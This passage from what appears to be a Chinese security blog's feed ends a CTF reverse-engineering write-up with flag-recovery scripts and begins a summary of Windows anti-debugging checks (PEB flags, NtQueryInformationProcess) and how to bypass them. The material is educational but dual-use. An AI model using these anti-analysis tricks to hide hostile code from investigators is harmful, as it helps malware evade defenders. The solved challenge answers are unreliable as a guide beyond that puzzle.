class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.text:<span class="number">00401513</span>                 push    eax</span><br><span class="line">.text:<span class="number">00401514</span>                 push    ecx</span><br><span class="line">.text:<span class="number">00401515</span>                 call    sub_4010A0</span><br><span class="line">.text:<span class="number">0040151</span>A                 add     eax, <span class="number">15</span>h</span><br><span class="line">.text:<span class="number">0040151</span>D                 push    eax</span><br><span class="line">.text:<span class="number">0040151</span>E                 pop     eax</span><br><span class="line">.text:<span class="number">0040151F</span>                 mov     ecx, <span class="number">0F</span>FFFFFFFh</span><br><span class="line">.text:<span class="number">00401524</span>                 <span class="keyword">xor</span>     eax, ecx</span><br><span class="line">.text:<span class="number">00401526</span>                 push    eax</span><br><span class="line">.text:<span class="number">00401527</span>                 pop     ecx</span><br><span class="line">.text:<span class="number">00401528</span>                 <span class="keyword">not</span>     ecx</span><br><span class="line">.text:<span class="number">0040152</span>A                 push    ecx</span><br><span class="line">.text:<span class="number">0040152B</span>                 retn</span><br><span class="line">.text:<span class="number">0040152B</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0040152</span>C                 db  <span class="number">7</span>Eh ; ~</span><br><span class="line">.text:<span class="number">0040152</span>D                 db <span class="number">0F</span>Fh</span><br><span class="line">.text:<span class="number">0040152</span>E                 db  <span class="number">15</span>h</span><br><span class="line">.text:<span class="number">0040152F</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0040152F</span>                 pop     ecx</span><br><span class="line">.text:<span class="number">00401530</span>                 pop     eax</span><br></pre></td></tr></table></figure><p>解决方法，全部patch即可。</p><p>之后就可以看到流程了，加了平坦化控制流，尝试去了下没去掉，今天日常访问大佬博客Mason，看到了个github链接<a href="https://github.com/moliam/llvm-fla-cracker">https://github.com/moliam/llvm-fla-cracker</a>。</p><p>然后在有数据处理的地方打上断点。</p><p>加密一</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">399047545</span>:</span><br><span class="line">v35 = ~flag[i] &amp; v35 | ~v35 &amp; flag[i];</span><br><span class="line">v36 = ~flag[i];</span><br><span class="line">v23 = <span class="number">-1395711487</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">flag[v33] = ~flag[v33] &amp; v35 | ~v35 &amp; flag[v33];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是将32byte转为8DWORD，然后全部异或产生一个值，然后和flag[i]挨着异或，翻译下就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag=[<span class="number">0x6463626b</span>,<span class="number">0x6867666b</span>,<span class="number">0x6c6b6a6e</span>,<span class="number">0x706f6e39</span>,<span class="number">0x74737271</span>,<span class="number">0x78777675</span>,<span class="number">0x42417a79</span>,<span class="number">0x46454443</span>]</span><br><span class="line">temp=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    temp=flag[i]^temp</span><br><span class="line">print(<span class="built_in">hex</span>(temp))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    flag[i]=flag[i]^temp</span><br><span class="line">    print(<span class="built_in">hex</span>(flag[i]),end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解的话爆破就行，异或的特性，可以看做单字节单字节的，得到异或的4byte数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enc=[<span class="number">0x6660656b</span>,<span class="number">0x35613568</span>,<span class="number">0x3161306e</span>,<span class="number">0x633d6039</span>,<span class="number">0x32666535</span>,<span class="number">0x3063306c</span>,<span class="number">0x3060606b</span>,<span class="number">0x603d336b</span>]</span><br><span class="line">xor=[]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">        a=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            a^=((enc[j]&gt;&gt;<span class="number">8</span>*k)&amp;<span class="number">0xff</span>)^i</span><br><span class="line">        <span class="keyword">if</span>(a==i):</span><br><span class="line">            xor.append(<span class="built_in">hex</span>(i))</span><br><span class="line">print(xor)</span><br></pre></td></tr></table></figure><p>然后第二部分就是变表base加密，3个为一组，共11轮，除了第一组，每次都进行base64加密的时候，都会将后面还没base64加密的数据先异或一个长度为三的key，key由上一轮base64加密中table[index]中的index组成。翻译如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">key=[<span class="number">0</span>]*<span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    key[<span class="number">0</span>] = flag[r * <span class="number">3</span>] &gt;&gt; <span class="number">2</span></span><br><span class="line">    key[<span class="number">1</span>] = (flag[r * <span class="number">3</span>] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span> | (flag[r * <span class="number">3</span> + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>)</span><br><span class="line">    key[<span class="number">2</span>]=(flag[r * <span class="number">3</span> + <span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">2</span> | (flag[r * <span class="number">3</span> + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>((r+<span class="number">1</span>)*<span class="number">3</span>,<span class="number">33</span>):</span><br><span class="line">        flag[i]=flag[i]^key[i%<span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>解的话可以采用z3，如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">enc=[<span class="number">0x6b</span>,<span class="number">0x65</span>,<span class="number">0x60</span>,<span class="number">0x7c</span>,<span class="number">0x5e</span>,<span class="number">0x20</span>,<span class="number">0x64</span>,<span class="number">0x6</span>,<span class="number">0x43</span>,<span class="number">0x2c</span>,<span class="number">0x52</span>,<span class="number">0x5</span>,<span class="number">0x2e</span>,<span class="number">0x56</span>,<span class="number">0x1</span>,<span class="number">0x7f</span>,<span class="number">0x26</span>,<span class="number">0x41</span>,<span class="number">0x65</span>,<span class="number">0x13</span>,<span class="number">0x51</span>,<span class="number">0x2a</span>,<span class="number">0x53</span>,<span class="number">0x0</span>,<span class="number">0x7b</span>,<span class="number">0x75</span>,<span class="number">0x5c</span>,<span class="number">0x3e</span>,<span class="number">0x49</span>,<span class="number">0x1a</span>,<span class="number">0x3c</span>,<span class="number">0x66</span>,<span class="number">0x50</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>)]</span><br><span class="line"></span><br><span class="line">key=[<span class="number">0</span>]*<span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    key[<span class="number">0</span>] = flag[r * <span class="number">3</span>] &gt;&gt; <span class="number">2</span></span><br><span class="line">    key[<span class="number">1</span>] = (flag[r * <span class="number">3</span>] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span> | (flag[r * <span class="number">3</span> + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>)</span><br><span class="line">    key[<span class="number">2</span>]=(flag[r * <span class="number">3</span> + <span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">2</span> | (flag[r * <span class="number">3</span> + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>((r+<span class="number">1</span>)*<span class="number">3</span>,<span class="number">33</span>):</span><br><span class="line">        flag[i]=flag[i]^key[i%<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    s.add(flag[i]==enc[i])</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">m=s.model()</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><p>或者采用下面的方式，先求出所有的key，然后以同样的方式去异或。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解变表base</span></span><br><span class="line">str1 = <span class="string">&#x27;Fi9X/fxX6Q6JBfUfBM1V/y6V6PcPjMaQLl9IuttFuH68&#x27;</span></span><br><span class="line">string1 = <span class="string">&#x27;QVEJAfHmUYjBac+u8Ph5n9Od16FrICL/X0GvtM4qk7T2z3wNSsyoebilxWKgZpRD&#x27;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">    print(<span class="built_in">hex</span>(string1.index(str1[i])), end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># get key1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">4</span> == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    print(<span class="built_in">hex</span>(string1.index(str1[i])), end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">enc = base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1, string2)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    print(<span class="built_in">hex</span>(i), end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0x6b</span>, <span class="number">0x65</span>, <span class="number">0x60</span>, <span class="number">0x7c</span>, <span class="number">0x5e</span>, <span class="number">0x20</span>, <span class="number">0x64</span>, <span class="number">0x6</span>, <span class="number">0x43</span>, <span class="number">0x2c</span>, <span class="number">0x52</span>, <span class="number">0x5</span>, <span class="number">0x2e</span>, <span class="number">0x56</span>, <span class="number">0x1</span>, <span class="number">0x7f</span>, <span class="number">0x26</span>, <span class="number">0x41</span>, <span class="number">0x65</span>,</span><br><span class="line">       <span class="number">0x13</span>, <span class="number">0x51</span>, <span class="number">0x2a</span>, <span class="number">0x53</span>, <span class="number">0x0</span>, <span class="number">0x7b</span>, <span class="number">0x75</span>, <span class="number">0x5c</span>, <span class="number">0x3e</span>, <span class="number">0x49</span>, <span class="number">0x1a</span>, <span class="number">0x3c</span>, <span class="number">0x66</span>, <span class="number">0x50</span>]</span><br><span class="line"></span><br><span class="line">key1 = [<span class="number">0x1a</span>, <span class="number">0x36</span>, <span class="number">0x15</span>, <span class="number">0x1f</span>, <span class="number">0x5</span>, <span class="number">0x38</span>, <span class="number">0x19</span>, <span class="number">0x0</span>, <span class="number">0x19</span>, <span class="number">0xb</span>, <span class="number">0x5</span>, <span class="number">0x8</span>, <span class="number">0xb</span>, <span class="number">0x25</span>, <span class="number">0x18</span>, <span class="number">0x1f</span>, <span class="number">0x32</span>, <span class="number">0x19</span>, <span class="number">0x19</span>,</span><br><span class="line">        <span class="number">0x11</span>, <span class="number">0xd</span>, <span class="number">0xa</span>, <span class="number">0x25</span>, <span class="number">0xc</span>, <span class="number">0x1e</span>, <span class="number">0x37</span>, <span class="number">0x15</span>, <span class="number">0xf</span>, <span class="number">0x24</span>, <span class="number">0x24</span>, <span class="number">0xf</span>, <span class="number">0x6</span>, <span class="number">0x19</span>]</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0</span>] * <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    key[<span class="number">0</span>] = key1[r * <span class="number">3</span>]</span><br><span class="line">    key[<span class="number">1</span>] = key1[r * <span class="number">3</span> + <span class="number">1</span>]</span><br><span class="line">    key[<span class="number">2</span>] = key1[r * <span class="number">3</span> + <span class="number">2</span>]</span><br><span class="line">    print(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>((r + <span class="number">1</span>) * <span class="number">3</span>, <span class="number">33</span>):</span><br><span class="line">        enc[i] = enc[i] ^ key[i % <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">xor = [<span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">5</span>, <span class="number">0x53</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(enc[i] ^ xor[i % <span class="number">4</span>])</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#fce5e3dfc6db4f808ccaa6fcffecf583</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows反调试总结</title>
      <link href="2022/01/11/windows%E5%8F%8D%E8%B0%83%E8%AF%95%E6%80%BB%E7%BB%93/"/>
      <url>2022/01/11/windows%E5%8F%8D%E8%B0%83%E8%AF%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows反调试总结"><a href="#Windows反调试总结" class="headerlink" title="Windows反调试总结"></a>Windows反调试总结</h1><p>本文总结下windows下常见的反调试技术，尽量完全，如果不适用win10的就不总结了，也是对《逆向工程核心原理相关部分的一个总结》，目前更新状态，静态反调试快弄完了，动态的尽快吧，hook api应该也是最近更。</p><p>期末也是过去了，表面上复习，实际上是休息了一个月左右，嘿嘿，现在也是寒假了，也是准备提升下自己的编程能力，学习下常见病毒编程技术，网络编程，和python进阶。</p><h2 id="静态反调试"><a href="#静态反调试" class="headerlink" title="静态反调试"></a>静态反调试</h2><p>PEB结构体。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">  BYTE                          Reserved1[<span class="number">2</span>];</span><br><span class="line">  BYTE                          BeingDebugged;</span><br><span class="line">  BYTE                          Reserved2[<span class="number">1</span>];</span><br><span class="line">  PVOID                         Reserved3[<span class="number">2</span>];</span><br><span class="line">  PPEB_LDR_DATA                 Ldr;</span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;</span><br><span class="line">  PVOID                         Reserved4[<span class="number">3</span>];</span><br><span class="line">  PVOID                         AtlThunkSListPtr;</span><br><span class="line">  PVOID                         Reserved5;</span><br><span class="line">  ULONG                         Reserved6;</span><br><span class="line">  PVOID                         Reserved7;</span><br><span class="line">  ULONG                         Reserved8;</span><br><span class="line">  ULONG                         AtlThunkSListPtr32;</span><br><span class="line">  PVOID                         Reserved9[<span class="number">45</span>];</span><br><span class="line">  BYTE                          Reserved10[<span class="number">96</span>];</span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">  BYTE                          Reserved11[<span class="number">128</span>];</span><br><span class="line">  PVOID                         Reserved12[<span class="number">1</span>];</span><br><span class="line">  ULONG                         SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure><p>如何获取PEB结构体的地址</p><ul><li>方法一</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax，DWORD PTR FS:[0x30]；address of PEB</span><br></pre></td></tr></table></figure><ul><li>方法二</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax，DWORD PTR FS:[0x18]；address of TEB</span><br><span class="line">mov eax，DWORD PTR DS:[eax+0x30]</span><br></pre></td></tr></table></figure><ul><li>方法三</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">FARPROC pProc &#x3D; NULL;</span><br><span class="line">LPBYTE pTEB &#x3D; NULL;</span><br><span class="line">LPBYTE pPEB &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">pProc &#x3D; GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;NtCurrentTeb&quot;);</span><br><span class="line">pTEB &#x3D; (LPBYTE)(*pProc)();               &#x2F;&#x2F; address of TEB</span><br><span class="line">pPEB &#x3D; (LPBYTE) * (LPDWORD)(pTEB + 0x30);     &#x2F;&#x2F; address of PEB</span><br></pre></td></tr></table></figure><h3 id="BeingDebugged"><a href="#BeingDebugged" class="headerlink" title="BeingDebugged"></a>BeingDebugged</h3><p>进程处于调试状态，PEB.BeingDebugged(偏移+2)的值就会变为1，未调试状态为0。</p><p>isDebuggerPresent函数就是通过修改这个PEB.BeingDebugged来达到检测进程是否处于调试的目的。</p><p>下面是自己写的一个例子，我们然后自己来调试看看isDebuggerPresent内部是什么样子。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL check;</span><br><span class="line"></span><br><span class="line">check = IsDebuggerPresent();</span><br><span class="line"><span class="keyword">if</span> (check == TRUE)</span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Being Debugger&quot;</span>,<span class="string">&quot;The_Itach1&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;No Debugger&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test1();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ida中调试isDebuggerPresent函数。<br><img src="https://s2.loli.net/2022/01/09/IZXNRymveqPchTY.png"><br>可以看到就是先获取了PEB结构体的地址，然后找到偏移为2的PEB.BeingDebugged的值，然后返回。</p><p>破解的话就直接，修改返回值，或者改跳转之类，或者直接修改PEB.BeingDebugged的值。</p><h3 id="NtGlobalFlag"><a href="#NtGlobalFlag" class="headerlink" title="NtGlobalFlag"></a>NtGlobalFlag</h3><p>进程处于调试状态，PEB.NtGlobalFlag(+68)的值会变为0x70，所以该特点也可以作为反调试的一个标志。</p><p>代码如下，vs直接运行不报被调试，ida调试会报。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FARPROC pProc = <span class="literal">NULL</span>;</span><br><span class="line">LPBYTE pTEB = <span class="literal">NULL</span>;</span><br><span class="line">LPBYTE pPEB = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">pProc = GetProcAddress(GetModuleHandle(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtCurrentTeb&quot;</span>);</span><br><span class="line">pTEB = (LPBYTE)(*pProc)();               <span class="comment">// address of TEB</span></span><br><span class="line">pPEB = (LPBYTE) * (LPDWORD)(pTEB + <span class="number">0x30</span>);     <span class="comment">// address of PEB</span></span><br><span class="line"></span><br><span class="line">DWORD dwNtGlobalFlag = *(LPDWORD)(pPEB + <span class="number">0x68</span>);</span><br><span class="line"><span class="keyword">if</span> (dwNtGlobalFlag == <span class="number">0x70</span>)</span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Being Debugger&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;No Debugger&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>破解方法和上面差不多。</p><h3 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a>NtQueryInformationProcess</h3><p>用这个函数可以用来获取各种与进程调试的信息。官方文档<a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess">https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">__kernel_entry NTSTATUS <span class="title">NtQueryInformationProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            HANDLE           ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            PROCESSINFOCLASS ProcessInformationClass,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out]           PVOID            ProcessInformation,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            ULONG            ProcessInformationLength,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out, optional] PULONG           ReturnLength</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>ProcessInformationClass，实际上官方文档根本不全。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">PROCESS_INFORMATION_CLASS</span> &#123;</span></span><br><span class="line">  ProcessMemoryPriority,</span><br><span class="line">  ProcessMemoryExhaustionInfo,</span><br><span class="line">  ProcessAppMemoryInfo,</span><br><span class="line">  ProcessInPrivateInfo,</span><br><span class="line">  ProcessPowerThrottling,</span><br><span class="line">  ProcessReservedValue1,</span><br><span class="line">  ProcessTelemetryCoverageInfo,</span><br><span class="line">  ProcessProtectionLevelInfo,</span><br><span class="line">  ProcessLeapSecondInfo,</span><br><span class="line">  ProcessMachineTypeInfo,</span><br><span class="line">  ProcessInformationClassMax</span><br><span class="line">&#125; PROCESS_INFORMATION_CLASS;</span><br></pre></td></tr></table></figure><p>主要看二三参数</p><p>ProcessInformationClass代表要检索的进程信息的类型，实际上就是调用相关的函数来获取信息，我们主要关注和调试相关的，也就是ProcessDebugPort(0x7)，ProcessDebugObjectHandle(0x1e)，ProcessDebugFlags(0x1f)。</p><p>ProcessInformation，相关函数的返回信息到这个参数。</p><p>下面以一个例子来说说这三种。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 